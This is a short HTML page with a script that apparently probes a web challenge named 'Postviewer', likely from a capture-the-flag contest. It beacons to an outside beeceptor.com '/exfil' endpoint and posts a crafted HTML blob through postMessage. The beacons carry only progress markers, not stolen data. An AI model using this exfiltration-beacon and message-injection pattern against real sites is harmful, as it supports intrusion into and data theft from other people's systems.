<!doctype html>
<html>
<body>
<script>
/* ping : la page externe est chargée */
new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=outer_loaded';

(async () => {
  /* --- blob HTML minimal : uniquement une balise <img> --- */
  const epic = `
    <html><body>
      <img src="https://webtest.free.beeceptor.com/exfil?f=blob_start">
    </body></html>`;

  const blob = new Blob([epic], {type:'text/html'});

  /* --- envoi à Postviewer --- */
  window.postMessage({
    type:'share',
    files:[{blob, name:'probe.html', cached:false}]
  }, '*');

  new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=postmessage_sent';
})();
</script>
</body>
</html>
